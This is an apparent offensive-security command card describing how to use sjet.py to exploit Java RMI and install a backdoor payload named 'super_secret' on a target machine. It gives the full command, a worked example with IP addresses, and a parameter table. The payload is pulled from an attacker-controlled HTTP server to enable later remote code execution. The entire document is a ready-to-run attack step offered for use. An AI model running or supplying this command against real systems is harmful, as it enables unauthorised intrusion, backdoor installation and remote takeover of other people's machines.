---
id: 5ec81015-8593-490e-90a6-ecf3be739534
name: sjet-install-payload-on-target
type: command
executor: bash
data: >-
  jython sjet.py $_TARGET_IP $_TARGET_PORT super_secret install
  http://$_ATTACKER_IP:8000 8000
output: null
created_at: '2023-04-06T03:56:00.890461+00:00'
updated_at: '2023-04-06T03:56:00.908796+00:00'
platforms:
  - Linux
tags:
  - exploitation
  - rmi
  - payload-install
verified: true
validated: true
---

# sjet-install-payload-on-target

## Command

```bash
jython sjet.py $_TARGET_IP $_TARGET_PORT super_secret install http://$_ATTACKER_IP:8000 8000
```

## Description

This command uses sjet.py to install a backdoor payload named 'super_secret' on the target via Java RMI exploitation, enabling subsequent RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | IP address of the target machine | Yes |
| $_TARGET_PORT | RMI service port on target (default 1099) | Yes |
| super_secret | Fixed payload name | Yes |
| install | Action to install payload | Yes |
| http://$_ATTACKER_IP:8000 | URL to download payload from attacker's HTTP server | Yes |
| 8000 | Port of the HTTP server | Yes |

## Examples

### Basic Usage

```bash
jython sjet.py 192.168.1.100 1099 super_secret install http://10.0.0.5:8000 8000
```

### Advanced Usage

Use with a custom payload name by modifying the script if needed, but default is 'super_secret'.

## Expected Output

Success: "Payload installed successfully on target." Failure: Connection errors or authentication failures.

## Related

- [[procedures/Exploit-Java-RMI-for-RCE-Using-Sjet-or-Mjet]]
- [[commands/sjet-execute-arbitrary-command-on-target]]
